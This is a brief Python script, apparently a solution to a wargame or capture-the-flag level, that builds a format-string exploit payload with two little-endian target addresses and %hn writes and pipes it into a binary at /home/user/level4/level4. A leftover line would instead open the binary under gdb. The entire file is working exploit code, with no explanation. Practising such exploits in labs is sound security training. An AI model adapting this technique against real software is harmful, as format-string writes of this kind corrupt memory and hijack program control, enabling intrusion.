#!/usr/bin/python

import os

writeAddr = "\x08\x04\x98\x10"[::-1]
writeAddr2 = "\x08\x04\x98\x12"[::-1]
payload = writeAddr2 + writeAddr + "%250d" + "%12\$hn" + "%21570d" + "%13\$hn" 
cmd = "echo \"" + payload + "\" > /tmp/input && gdb -tui /home/user/level4/level4"
cmd = "echo \"" + payload + "\" | /home/user/level4/level4"
os.system(cmd)
